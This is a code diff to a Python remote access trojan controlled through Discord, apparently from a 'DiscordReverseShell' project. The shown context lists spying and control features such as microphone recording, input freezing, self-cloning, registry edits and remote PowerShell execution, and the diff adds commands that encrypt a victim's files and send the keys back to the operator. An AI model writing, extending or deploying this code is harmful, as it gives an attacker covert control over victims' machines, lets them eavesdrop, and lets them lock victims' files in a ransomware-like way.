@@ -2,6 +2,7 @@ import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard, 
 from pynput.mouse import Controller
 from PIL import ImageGrab, Image
 import cv2, pyaudio, datetime
+import cryptography.fernet as fernet
 #from tkinter import messagebox
 import sys
 from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE, ANTIDEBUG
@@ -145,6 +146,8 @@ commands = "\n".join([
     "mic - Record 120 seconds recordings of microphone and send them",
     "join - Joins or leaves voice channel where it streams live microphone",
     "freeze <1/0> - Freeze all inputs from keyboard and mouse",
+    "decrypt <key or keys separated by commas(",") without spaces> <file> - Decrypt an file",
+    "encrypt <number of times to encrypt> <file> - Encrypt an file",
     "clone <path> - Clone the malware to the specified path, make sure to enter path whit name of the output file",
     "regedit <1 / 2 / 3> <key path> <value name> OR regedit 2 <key path> <value name> <value type: string / expandable_string / multi_string / dword / qword / binary> <value data> - Regedit: 1 - Show value, 2 - Create value, 3 - Delete value",
     "!quit - Exit session without deleting all the data",
@@ -155,7 +158,7 @@ commands = "\n".join([
 
 
 def encrypt(file, key):
-    if os.path.exists(file):
+    if os.path.exists(file) and os.path.isfile(file):
         try:
             content = open(file, "rb").read()
             encrypted = key.encrypt(content)
@@ -164,7 +167,7 @@ def encrypt(file, key):
     else: return False
     
 def decrypt(file, key):
-    if os.path.exists(file):
+    if os.path.exists(file) and os.path.isfile(file):
         try:
             content = open(file, "rb").read()
             encrypted = key.decrypt(content)
@@ -506,7 +509,7 @@ async def on_message(message):
             error_output = output[1].decode("utf-8")
             normal_output = output[0].decode("utf-8")
         except:
-            await message.reply("Failed to execute pw command!")
+            await message.reply("Failed to execute cmd command!")
             return
         
         embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa)
@@ -545,7 +548,7 @@ async def on_message(message):
     elif message.content.startswith("pw "):
         command = message.content[3:]
         try:
-            output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP).communicate()#[0].decode("utf-8") #  , creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
+            output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8") #  , creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
             error_output = output[1].decode("utf-8")
             normal_output = output[0].decode("utf-8")
         except:
@@ -888,6 +891,75 @@ async def on_message(message):
         except: pass
 
 
+#! ENCRYPT
+    elif message.content.startswith("encrypt "): # encrypt <number of times to encrypt> <file> - Encrypt an file
+        try:
+            args = message.content.split(" ", 2) # encrypt 1 Test 1\test.txt
+            repeat = int(args[1]) # 1
+            path = args[2] # Test 1\test.txt
+        except:
+            embed = discord.Embed(title="Error",  description=f"```Invalid command structure, please structure your command like this:\nencrypt <how many times to encrypt file> <file path>```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed)
+            return
+        
+        keys = []
+
+        for i in range(repeat):
+            key = fernet.Fernet.generate_key()
+            keys.append(key.decode())
+            f = fernet.Fernet(key)
+            
+            if encrypt(path, f) == False:
+                embed = discord.Embed(title="Encrypt",  description=f"```Invalid file path, make sure that path is valid and it is file not directory!```", color=0xfafafa)
+                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                await message.reply(embed=embed)
+                return
+            
+
+        keys_merged = "\n".join(keys)
+        embed = discord.Embed(title="Encrypt",  description=f"```File: {path}\nKeys used:\n{keys_merged}```", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+        #with open("keys.txt", "w", encoding="utf-8") as f: f.write(keys_merged)
+        
+        await message.reply(embed=embed) #, file=discord.File("keys.txt")
+        #delete_files(["keys.txt"])
+        return
+        
+
+#! DECRYPT
+    elif message.content.startswith("decrypt "): # decrypt <key or keys separated by commas(",") without spaces> <file> - Decrypt an file
+        try:
+            args = message.content.split(" ", 3) # decrypt rs-wypwa4ZFr7DwqcUVI4V9al0qLvhe692mqY62cTl8= Test 1\test.txt
+            #repeat = int(args[1]) # 1
+            keys = args[1].split(",")
+            path = args[2]
+        except:
+            embed = discord.Embed(title="Error",  description=f"```Invalid command structure, please structure your command like this:\ndecrypt <how many times to decrypt file> <file path>```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed)
+            return
+
+        for key in keys:
+            #key = fernet.Fernet.generate_key()
+            f = fernet.Fernet(key.encode())
+            
+            if decrypt(path, f) == False:
+                embed = discord.Embed(title="Decrypt",  description=f"```Invalid file path or wrong key, make sure that path is valid and it is file not directory!```", color=0xfafafa)
+                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                await message.reply(embed=embed)
+                return
+
+        keys_merged = "\n".join(keys)
+        embed = discord.Embed(title="Decrypt",  description=f"```File: {path}\nKeys used:\n{keys_merged}```", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+        #with open("keys.txt", "w", encoding="utf-8") as f: f.write(keys_merged)
+        
+        await message.reply(embed=embed) #, file=discord.File("keys.txt")
+        #delete_files(["keys.txt"])
+        return
+
+
 #SELF DESTRUCT
     elif message.content.startswith("!selfdestruct"):
         if message.content.startswith("!selfdestruct CONFIRM"):
@@ -949,4 +1021,3 @@ else: Startup(sys.argv[0])
 #subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 #subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
